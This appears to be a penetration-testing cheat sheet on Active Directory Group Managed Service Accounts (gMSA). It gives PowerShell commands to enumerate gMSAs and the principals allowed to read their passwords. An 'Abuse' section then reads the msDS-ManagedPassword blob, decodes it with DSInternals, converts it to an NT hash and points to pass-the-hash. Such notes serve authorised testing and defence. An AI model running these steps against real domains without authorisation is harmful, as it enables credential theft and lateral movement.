# gMSA

## Theory

Group Managed Service Account (gMSA) provides automatic password management, SPN management and delegated administration for service account across multiple servers.\
It protects against Kerberoast attack type by generating a random 256 bytes password and rotating it every 30 days.

To read the password you need the <mark style="color:purple;">**msds-ManagedPassword**</mark> permission

## Enumeration

To enumerate gMSAs, we can use the ADModule

```powershell
Get-ADServiceAccount -Filter *
```

<figure><img src="https://github.com/italianpenty/WriteUps/raw/main/.gitbook/assets/immagine%20(11).png" alt=""><figcaption></figcaption></figure>

Enumerate the Principals that can read the password blob:

{% code overflow="wrap" %}
```powershell
Get-ADServiceAccount -Identity jumpone -Properties * | select PrincipalsAllowedToRetrieveManagedPassword
```
{% endcode %}

<figure><img src="https://github.com/italianpenty/WriteUps/raw/main/.gitbook/assets/immagine%20(12).png" alt=""><figcaption></figcaption></figure>

## Abuse

### Read current password

{% hint style="info" %}
You need a principal that can read the blob
{% endhint %}

Use [ADmodule ](https://github.com/samratashok/ADModule)and [DSInternal](https://github.com/MichaelGrafnetter/DSInternals)

{% code overflow="wrap" %}
```powershell
$Passwordblob = (Get-ADServiceAccount -Identity <$User> -Properties msDS-ManagedPassword).'msDS-ManagedPassword'
```
{% endcode %}

{% code overflow="wrap" %}
```powershell
$decodedpwd = ConvertFrom-ADManagedPasswordBlob $Passwordblob
```
{% endcode %}

```powershell
ConvertTo-NTHash -password $decodedpwd.SecureCurrentPassword
```

<figure><img src="../../../../.gitbook/assets/immagine (13).png" alt=""><figcaption></figcaption></figure>

Now you can [pass the hash](../../lateral-movement/pass-the/pass-the-hash.md)

## References

{% embed url="https://learn.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview" %}

